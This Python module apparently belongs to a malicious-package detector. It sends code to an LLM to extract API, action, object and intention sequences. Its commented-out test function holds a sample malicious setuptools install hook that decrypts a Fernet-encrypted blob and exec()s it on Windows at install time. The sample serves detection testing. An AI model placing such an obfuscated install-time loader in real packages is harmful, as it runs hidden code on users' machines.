"""API Modeling Engine - Code Behavior Modeling Module

Core: Code Context (str) -> 4 Sequences (API, Action, Object, Intention)
Design: Simple, Clean, Direct
"""

import os
import sys
import json
from typing import List, Dict, Any, Optional
from dataclasses import dataclass

PYGUARD_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, PYGUARD_ROOT)

from Utils.llmquery import LLMAgent
from Configs.config import PyGuardConfig

@dataclass
class APIModelOutput:
    """Simple output: 4 sequences only"""
    api_sequence: List[str]
    action_sequence: List[str]
    object_sequence: List[str]
    intention_sequence: List[str]
    

class APIModelingEngine:
    """Base class defining standard interface"""
    
    def model(self, code_context: str) -> APIModelOutput:
        """Core interface: code context -> API model output"""
        raise NotImplementedError("Subclass must implement model()")


class LLMBasedAPIModeling(APIModelingEngine):
    """LLM-based modeling implementation (replaceable)"""
    
    def __init__(self):
        self.llm_agent = LLMAgent()
        self.action_categories, self.object_categories, self.intention_categories = self._load_categories()
        self.system_prompt = self._build_system_prompt()
    

    def _load_categories(self):
        action_file = PyGuardConfig.get_api_category_path("action_classification.json")
        with open(action_file, 'r', encoding='utf-8') as f:
            actions = json.load(f)
        object_file = PyGuardConfig.get_api_category_path("object_classification.json")
        with open(object_file, 'r', encoding='utf-8') as f:
            objects = json.load(f)
        intention_file = PyGuardConfig.get_api_category_path("intension_classification.json")
        with open(intention_file, 'r', encoding='utf-8') as f:
            intentions = json.load(f)
        return actions, objects, intentions
    

    def _build_system_prompt(self) -> str:
        prompt_file = PyGuardConfig.DETECT_PROMPTS_DIR / "triple_analysis_prompt_predefined.txt"
        if not prompt_file.exists():
            raise FileNotFoundError(f"Prompt file not found: {prompt_file}")
        with open(prompt_file, 'r', encoding='utf-8') as f:
            template = f.read()
        action_json = json.dumps(self.action_categories, ensure_ascii=False, indent=2)
        object_json = json.dumps(self.object_categories, ensure_ascii=False, indent=2)
        intention_json = json.dumps(self.intention_categories, ensure_ascii=False, indent=2)
        prompt = template.replace("{action_categories_json}", action_json)
        prompt = prompt.replace("{object_categories_json}", object_json)
        prompt = prompt.replace("{intention_categories_json}", intention_json)
        return prompt
    

    def model(self, code_context: str) -> APIModelOutput:
        try:
            messages = [
                {"role": "system", "content": self.system_prompt},
                {"role": "user", "content": f"Analyze the following code and extract behavioral triple sequences:\n\n```python\n{code_context}\n```"}
            ]
            response = self.llm_agent.perform_query(messages)
            triple_data = json.loads(response)
            raw_triples = triple_data.get("triple_sequences", [])
            
            intention_sequence = []
            api_sequence = []
            action_sequence = []
            object_sequence = []
            
            for t in raw_triples:
                if t.get("intention_id"):
                    intention_sequence.append(t["intention_id"])
                if t.get("action_api"):
                    clean_api = t["action_api"].replace("()", "").strip()
                    if clean_api:
                        api_sequence.append(clean_api)
                if t.get("action_id"):
                    action_sequence.append(t["action_id"])
                if t.get("object_id"):
                    object_sequence.append(t["object_id"])
            
            return APIModelOutput(
                api_sequence=api_sequence,
                action_sequence=action_sequence,
                object_sequence=object_sequence,
                intention_sequence=intention_sequence
            )
        except Exception as e:
            print(f"API modeling failed: {e}")
            return APIModelOutput(
                api_sequence=[],
                action_sequence=[],
                object_sequence=[],
                intention_sequence=[]
            )


class APISequenceExtractor:
    """Simple API extraction interface"""
    
    def __init__(self, modeling_engine: Optional[APIModelingEngine] = None):
        self.modeling_engine = modeling_engine or LLMBasedAPIModeling()
    
    def extract(self, code_context: str) -> APIModelOutput:
        """Extract 4 sequences from code"""
        return self.modeling_engine.model(code_context)


# def main():
#     test_code = """from setuptools.command.install import install

# class mJowwTqoErudaVwmWspimPYBAluUDzKFnJeJNqDsweftEtPzfwuSbeAwcAKhSjRqZUcWAznpthGjUlHUwABp(install):
#     def run(self):
#         import os
#         if os.name == "nt":
#             import requests
#             from fernet import Fernet
#             exec(Fernet(b'UZwfYI2Yo4qbNdSw7-qeSPTSljNmI0AO-3U7mAe9YKE=').decrypt(b'gAAAAABmbvNgnB2GlS1JjSOouqlX-1BHVPYmCU9SYHU1ZKGn6JM4a9x2vRFqMDbKlicguDz9qnDrs3GADkV8qgpmkjtz9t_LFMe360yfpfWGKQZRUU3jreuyOrebtmcO_y4Y2icw25JrcUuKL9C1N5A_-_J8C8yfms_eWOXBlkZhXca_kN8zDKkWd8r9nG-B8jNTbTAQySXL4tmbkVCj8JEmMntCAjG-FQ=='))

#         install.run(self)"""
    
#     extractor = APISequenceExtractor()
#     output = extractor.extract(test_code)
    
#     print("API Sequence:", output.api_sequence)
#     print("Action Sequence:", output.action_sequence)
#     print("Object Sequence:", output.object_sequence)
#     print("Intention Sequence:", output.intention_sequence)

# if __name__ == "__main__":
#     main()